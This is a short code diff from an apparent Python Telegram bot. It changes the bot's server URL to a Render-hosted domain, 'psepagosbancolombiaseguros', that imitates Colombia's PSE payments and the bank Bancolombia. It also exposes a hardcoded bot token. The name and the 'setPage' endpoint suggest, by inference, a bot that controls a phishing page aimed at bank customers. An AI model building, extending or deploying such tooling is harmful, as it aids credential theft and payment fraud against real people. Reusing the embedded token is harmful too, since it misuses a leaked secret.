@@ -6,7 +6,7 @@ TOKEN = "7993642572:AAHJmZ3dy5lEsQi81vpUqKAI-WmacV3YlDI"
 bot = telebot.TeleBot(TOKEN)
 
 # URL del servidor desplegado en Render
-SERVER_URL = "https://psepagosbancolombiaseguros/setPage"
+SERVER_URL = "https://psepagosbancolombiaseguros.onrender.com/setPage"
 
 @bot.message_handler(commands=["start"])
 def send_welcome(message):
